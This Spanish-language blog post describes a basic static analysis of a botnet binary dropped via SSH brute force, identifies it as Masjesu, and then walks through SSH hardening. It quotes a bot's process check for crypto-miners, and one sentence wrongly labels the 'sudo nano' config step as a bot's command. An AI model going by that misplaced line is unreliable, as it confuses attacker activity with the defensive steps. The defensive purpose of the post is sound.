Que es la Ingeniería inversa? La Ingeniería inversa implica descomponer algo para entender cómo fue creado y cómo funciona, lo cual puede ser útil para aprender, mejorar o identificar errores en el objeto o sistema.

En este caso lo que vamos a comenzar a hacer es enumerar un poco el binario descargado. Me voy a traer el binario a mi equipo local y lo primero que voy a hacer es usar el comando File, este fue el resultado:

![](/assets/images/ssh_expuesto/file_malware.png)

Como podemos ver, se trata de un ejecutable ELF de 64 bits. Además, notamos que está marcado como **"statically linked, not stripped"**, lo cual es una buena noticia. Esto significa que el binario **no depende de librerías externas** para funcionar, ya que todas están incluidas dentro de él (**statically linked**). También conserva información extra sobre su funcionamiento, como nombres de funciones y símbolos de depuración, lo que puede facilitarnos el análisis (**not stripped**).

Ahora bien, si hacemos un ```strings qLnWV2Qm5TJZwHN7QmPybNRlLE1HphWjfb```  para ver mas sobre su contenido podemos ver lo siguiente:

![](/assets/images/ssh_expuesto/strings.png)

Si bien esto no nos dice como funciona, si podemos ir aplicando inteligencia sobre estos datos, en este momento se me ocurrió filtrar por la palabra exploit directamente:

![](/assets/images/ssh_expuesto/strings_exploit.png)


Esto es interesante. Los nombres que aparecen al final parecen ser de dispositivos de red, cada uno dirigido a un protocolo o dispositivo específico. De momento, podemos concluir que este Malware está diseñado para explotar vulnerabilidades en dispositivos de red.

En este punto me la jugué y probé filtrar por términos como "cve", "backdoor" o "Success", pero no encontré nada relevante.

Después probé buscar por otras cosas como por ejemplo buscar por peticiones "GET", "POST", "USER-AGENT" y en este punto si encontré algo:

![](/assets/images/ssh_expuesto/posible_exploit.png)

Como pueden ver hay muchas partes en la que parece ejecutar cosas, estas parecen ser "payloads", hay un nombre que quiero destacar el cual me llamo mucho la atención: "masjesu".

Nuevamente, me fui a Google y lo busque...


## La Botnet Masjesu

![](/assets/images/ssh_expuesto/botnet-838x419x70x0x698x419x1604346303.png)

## Qué es una Botnet? 

Cuando hablamos de una **botnet**, nos referimos a una red de dispositivos infectados con malware (no solo Compus, hasta una **H E L A D E R A** puede caer). A estos dispositivos se les llama **bots**, y están bajo el control de un atacante. Pero, ¿por qué alguien querría infectar tantos bichos?

![](/assets/images/ssh_expuesto/malware.jpg)


Uno de los usos más comunes es armar ataques de **denegación de servicio distribuido (DDoS)**, básicamente, tirar abajo servidores a puro tráfico "falso". Para esto, los atacantes necesitan infectar una banda de dispositivos, algo que pueden hacer con una **campaña de malware**: mails truchos, páginas falsas, exploits... lo que pinte. Dependiendo del malware, pueden robar datos, meter bichos en la máquina para sumarlas a una botnet, minar criptos o hasta pedir guita con ransomware.

![](/assets/images/ssh_expuesto/Botnet_Attack.png)

Una vez que tienen su ejército de **zombies digitales**, lo manejan desde un **C&C (Command and Control)**, un servidor que les da órdenes a los bots. Todos los dispositivos infectados quedan conectados a este bicho y esperan instrucciones para atacar.

Pero ojo, **DDoS no es lo único para lo que sirven**. También pueden usarse como comentamos para **minar criptomonedas**, explotando el hardware de las víctimas sin que tengan idea. ¿Se acuerdan del log que pasé al principio? Bueno, ahí ya teníamos una pista de lo que estaba pasando...

Volvamos al Log:
![](/assets/images/ssh_expuesto/miner_1.png)

Como podemos ver, uno de esos bots estaba ejecutando el siguiente comando:

``` bash
ps | grep '[Mm]iner'
```


Este comando es bastante simple: lo que hace es buscar entre los procesos del sistema (**ps**) y filtrar (**grep**) aquellos que contengan la palabra "miner" o "Miner". Lo más probable es que este bot esté verificando si el sistema ya está infectado con malware para minar criptomonedas. Al no encontrar nada y al darse cuenta de que no hay una shell activa, probablemente se desconectó.

## Volviendo a Masjesu

Cuando estaba investigando en Internet, me encontré con un par de cosas bastantes interesantes:

Primero, parece que Masjesu es una botnet que “apunta a absolutamente todo”, lo que significa que no discrimina entre dispositivos, atacando todo lo que pueda. Esto tiene sentido, porque al analizar el malware que intentaron meterme, se veía claro que estaba diseñado para explotar vulnerabilidades en dispositivos de diferentes fabricantes de red (como ya vimos).

Segundo, me topé con una investigación de un analista en ciberseguridad, Mauricio J, quien profundizó más en el malware (o una variante del mismo) y sacó conclusiones clave. Por ejemplo, pudo identificar posibles ubicaciones del servidor de comando y control de la botnet, lo que es fundamental para neutralizarla.

Una cosa aún más importante a destacar es que esta botnet tiene un canal en Telegram (público) donde se pueden comprar los servicios de la botnet. Aunque Masjesu todavía parece ser una botnet pequeña, ya tiene suficiente potencial para causar estragos, y esto se sabe porque lo venden como un servicio tipo **SaaS (Software as a Service)**. Básicamente, cualquiera con algo de plata puede alquilarla para usarla en sus propios ataques.

![](/assets/images/ssh_expuesto/masjesu.png)

Es preocupante ver cómo este tipo de herramientas se venden tan fácilmente y están al alcance de cualquiera, lo que hace que los ataques DDoS y otros tipos de cibercrímenes sean cada vez más accesibles para más personas.

Dejo el post de Mauricio. J. (Léanlo hizo tremendo laburo) y mas referencias importantes, realmente son muy buenas y aportan demasiado.
* [Masjesu: Una botnet para gobernarlos a todos analisis](https://synawk.com/blog/masjesu-una-botnet-para-gobernarlos-a-todos-analisis-de-malware-0x3)
* [Alert: XorBot Comes Back with Enhanced Tactics](https://nsfocusglobal.com/alert-xorbot-comes-back-with-enhanced-tactics/)


## Mi consejo de oro: Ven los LOGS 


![](/assets/images/ssh_expuesto/mano-lupa-dibujada-estilo-comic-vintage_487677-47584.png)


Este análisis comenzó cuando noté intentos de conexión SSH a mi equipo, lo que me llevó a investigar más a fondo el binario descargado. A través de la ingeniería inversa, logramos descubrir que el malware estaba posiblemente diseñado para explotar vulnerabilidades en dispositivos de red, lo que nos permitió identificar la botnet Masjesu, conocida por utilizar ataques de fuerza bruta SSH para infectar sistemas.

Lo interesante de este caso es cómo una simple observación, como los intentos de conexión sospechosos, puede abrir la puerta a un análisis detallado y a la identificación de amenazas que podrían comprometer dispositivos conectados. Este ejemplo subraya la importancia de estar siempre alerta y monitorear nuestras conexiones de red, ya que cualquier detalle podría ser indicativo de un ataque en curso.

Este análisis también demuestra cómo la ingeniería inversa no es solo una herramienta para descubrir cómo funciona el malware, sino una forma de entender cómo interactúan los atacantes con nuestros sistemas y qué buscan explotar. Si algo positivo se puede sacar de este tipo de incidentes, es que nos da una oportunidad para aprender y reforzar nuestras defensas.

**Por ultimo y mas importante**...


### Exponer SSH (casi) sin  riesgos: ¿cómo?

---


![](/assets/images/ssh_expuesto/ssh_expuesto.jpg)


Para empezar, no es buena idea exponer SSH a Internet así nomás. Lo ideal sería que el servidor esté en una red con **"seguridad bien pulida"**.

¿A qué me refiero con eso? Que la red esté bien segmentada, con **firewalls bien configurados**, una **DMZ controlada** para aislar lo que tenga que estar expuesto y, lo más importante, que accedas a todo eso a través de una **VPN**.

Así te aseguras de que solo la gente que realmente tiene que entrar pueda hacerlo, y no cualquier bot o atacante que ande escaneando puertos.

De todas formas, paso a tirar unos piques para mejorar la seguridad:

Primero, lo mejor seria no usar el usuario Root para todo, es mas esto lo vamos a deshabilitar de la siguiente forma:
Como podemos ver, uno de esos bots estaba ejecutando el siguiente comando:

``` bash
sudo nano /etc/ssh/sshd_config
```

Si todo sale bien, tendremos el siguiente resultado: 

![](/assets/images/ssh_expuesto/sin_root.png)


Una vez estando acá, vamos a aprovechar para hacer algo, donde dice Port lo mas seguro es que por defecto este en el puerto 22. En este caso para dar una capa mas de seguridad lo vamos a cambiar a cualquier otro, por ejemplo el 50004 (Existen un total de 65536 puertos). Este cambio lo hacemos porque por lo general los BOTS están programados para analizar el puerto 22. 

Ahora, vamos a buscar la linea que dice PermitRootLogin y vamos a ponerle 'no', en caso de que no encuentren la linea PermitRootLogin pueden simplemente agregarla: 

![](/assets/images/ssh_expuesto/root.png)

Segundo, vamos a limitar la cantidad de conexiones validas por ssh al servidor, a mi personalmente me gusta solo dejar 3 conexiones, para esto vamos a agregar la siguiente linea: `MaxSessions 3`

![](/assets/images/ssh_expuesto/MaxSessions.png)

Tercero, algo que me gusta hacer es ocultar todo mensaje de indicio de Login, por ejemplo este de aquí:

![](/assets/images/ssh_expuesto/inicio_de_se.png)

Esto les sirve a los Bots para identificar cuando ya están dentro, para sacarlo debemos buscar la linea **PrintMotd** y dejarla en **no**:

![](/assets/images/ssh_expuesto/print_motd.png)


Cuarto, quitar la contraseña y usar una autenticaion por llaves, como funciona esto? 
Imagínate que tenés un **candado y dos llaves: una pública y una privada**.

![](/assets/images/ssh_expuesto/clave_publica_nn.png)

 **La llave pública** es como si le dieras una copia a un amigo o la dejaras en la casa de alguien de confianza (en este caso, el servidor). No importa si otros la ven, porque por sí sola no sirve para abrir el candado.

![](/assets/images/ssh_expuesto/privada_y_pub.png)

 **La llave privada** es **sagrada**, solo vos la tenés que tener. Si alguien más la agarra, te pueden abrir el candado y hacerse pasar por vos.
#### **¿Cómo funciona en SSH?**

![](/assets/images/ssh_expuesto/funcionamiento_de_claves.png)

Cuando te querés conectar a un servidor con SSH, el servidor usa **tu llave pública** para mandarte un desafío, y solo con **tu llave privada** podés resolverlo. Si la tenés bien guardada, entrás sin necesidad de meter una contraseña cada vez.

Es como si tu compu le dijera al servidor:  
_"Bo, tengo la llave posta, dejame pasar."_  
Y el servidor le responde:  
_"Dale, todo bien, pasá nomás."_ 

**Regla de oro:** No le pases tu llave privada a nadie (ni la guardes en Google Drive jaja).

### Aplicando par de llaves 

Primero, lo que vamos a hacer es lo siguiente (En nuestra maquina, no en el servidor):

![](/assets/images/ssh_expuesto/keygen.png)

Usamos el comando `ssh-keygen`. **-t** es para indicar el tipo de algoritmo de encriptado, en este caso, **RSA**. Con **-b** especificamos el tamaño en bits de la llave (cuanto más grande sea, más va a demorar en crearse).

![](/assets/images/ssh_expuesto/clave_creada.png)


En este punto, le damos **ENTER** a todo. Las opciones que dejamos en blanco son medidas de seguridad adicionales. Por ejemplo, donde dice "Enter passphrase", podés poner una contraseña para darle una capa extra de seguridad a la llave.

Ahora, una vez que la llave pública esté creada, la movemos al directorio de claves autorizadas del servidor SSH. Para eso, usamos el siguiente comando:

```bash
cat ~/.ssh/id_rsa.pub | ssh usuario@ip-del-servidor "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
```

![](/assets/images/ssh_expuesto/clave_creada_comando.png)

Ahora vamos a configurar el servidor para que solo acepte autenticación por llave pública. Para eso, ejecutamos:

```bash
sudo nano /etc/ssh/sshd_config
```

![](/assets/images/ssh_expuesto/pubkeyyes.png)

Buscamos la línea `PubkeyAuthentication` y la ponemos en **yes**. Después buscamos `PasswordAuthentication`, que es la opción que nos permite loguearnos con una contraseña, y la dejamos en **no** para eliminar esa posibilidad.

![](/assets/images/ssh_expuesto/PasswordAuthentication_no.png)

Finalmente, reiniciamos el servicio SSH:

![](/assets/images/ssh_expuesto/ssh.png)


Y ahora si pruebo mi conexión, van a ver que me va a dejar conectarme sin contraseña:

![](/assets/images/ssh_expuesto/connect.png)


## Blindado y listo...

---


![](/assets/images/ssh_expuesto/shield.png)

Si bien exponer SSH a Internet nunca es la mejor idea, con estas configuraciones reducís muchísimo los riesgos. **Usar llaves en vez de contraseñas, cambiar el puerto, limitar conexiones y evitar root** son cambios simples pero efectivos para dejarle la vida difícil a los atacantes.

Aún así, la seguridad nunca es algo estático. Siempre conviene **monitorear los accesos, revisar logs y aplicar actualizaciones** para estar un paso adelante.

Nunca te duermas en la seguridad. Cerrá sesión, chequeá los logs y asegurate de que tu servidor siga blindado. ¡Vamo arriba!